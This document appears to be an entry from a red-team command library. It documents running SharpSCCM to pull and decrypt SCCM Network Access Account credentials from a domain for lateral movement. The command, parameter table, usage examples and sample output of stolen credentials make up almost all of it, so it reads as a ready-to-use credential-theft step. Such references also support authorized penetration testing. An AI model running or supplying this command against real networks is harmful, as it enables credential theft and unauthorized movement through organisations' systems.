---
id: 75792c20-4c97-44fc-a488-36e19aae78b6
name: Retrieve NAA Credentials With SharpSCCM
type: command
executor: powershell
data: .\SharpSCCM.exe get naa -u $DOMAIN_USERNAME -p $DOMAIN_PASSWORD
output: null
created_at: '2023-04-06T03:56:08.224378+00:00'
updated_at: '2023-04-10T20:26:02.204187+00:00'
platforms:
  - Windows
tags:
  - sccm
  - credential-access
  - database
verified: true
validated: true
---

# Retrieve-NAA-Credentials-With-SharpSCCM

## Command

```powershell
.\SharpSCCM.exe get naa -u $DOMAIN_USERNAME -p $DOMAIN_PASSWORD
```

## Description

This command uses SharpSCCM to query the SCCM database for Network Access Account (NAA) credentials, authenticating with provided domain credentials. It retrieves and potentially decrypts NAA details for use in lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `get naa` | Action to retrieve NAA configuration | Yes |
| `-u $DOMAIN_USERNAME` | Domain username for authentication | Yes |
| `-p $DOMAIN_PASSWORD` | Domain password for authentication | Yes |
| `.\SharpSCCM.exe` | Path to the executable | Yes |

## Examples

### Basic Usage

```powershell
.\SharpSCCM.exe get naa -u attacker -p Password123
```

### Silent Mode

```powershell
.\SharpSCCM.exe get naa -u attacker -p Password123 --silent
```

## Expected Output

```

NAA Username: domain\sccm_naa
NAA Password: DecryptedPass456!
Server: sccm-server.domain.com

```

Displays NAA credentials and associated server details upon successful query.

## Related

- [[tools/SharpSCCM]]
- [[procedures/SCCM-Network-Access-Account-Credential-Theft]]
